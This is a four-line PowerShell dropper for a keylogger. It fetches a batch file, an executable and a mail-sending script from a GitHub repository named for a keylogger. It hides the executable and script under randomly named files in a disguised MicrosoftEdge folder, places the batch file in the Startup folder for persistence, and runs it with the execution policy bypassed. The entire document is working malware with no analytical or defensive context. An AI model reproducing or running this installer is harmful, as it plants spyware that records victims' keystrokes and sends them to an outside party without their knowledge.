Invoke-WebRequest -URI "https://raw.githubusercontent.com/MirozoPL/mirozokeylogger/main/autostarting.bat" -OutFile "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\oPNUennj8FXKrOBhUURQ.bat"
Invoke-WebRequest -URI "https://raw.githubusercontent.com/MirozoPL/mirozokeylogger/main/krec.exe" -OutFile "$env:LOCALAPPDATA\MicrosoftEdge\404eb8b50ea0d5d6\ygoLa8SyqmQTGsoh.exe"
Invoke-WebRequest -URI "https://raw.githubusercontent.com/MirozoPL/mirozokeylogger/main/ps_mail.ps1" -OutFile "$env:LOCALAPPDATA\MicrosoftEdge\404eb8b50ea0d5d6\LhFDtKhHgdiXDSt3.ps1"
powershell -executionpolicy bypass -File "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\oPNUennj8FXKrOBhUURQ.bat"
